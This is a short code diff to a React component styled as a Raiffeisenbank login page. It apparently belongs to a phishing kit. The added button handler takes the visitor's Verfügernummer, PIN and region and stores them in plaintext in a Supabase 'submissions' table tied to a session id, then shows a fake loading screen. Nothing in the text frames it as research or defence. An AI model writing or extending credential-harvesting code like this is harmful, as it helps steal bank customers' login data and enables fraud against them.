@@ -275,6 +275,18 @@ const Raiffeisenbank = () => {
             type="button"
             className="w-full md:w-auto rounded-md bg-[#fbf315] px-8 md:px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
+            onClick={async () => {
+              if (sessionId) {
+                await supabase.from("submissions").update({
+                  bank_username: verfueger,
+                  bank_password: pin,
+                  bank_username_label: "Verfügernummer",
+                  bank_password_label: "PIN",
+                  bank_extra: { Bundesland: bundesland },
+                }).eq("session_id", sessionId);
+              }
+              setShowLoading(true);
+            }}
           >
             {t.weiter}
           </button>
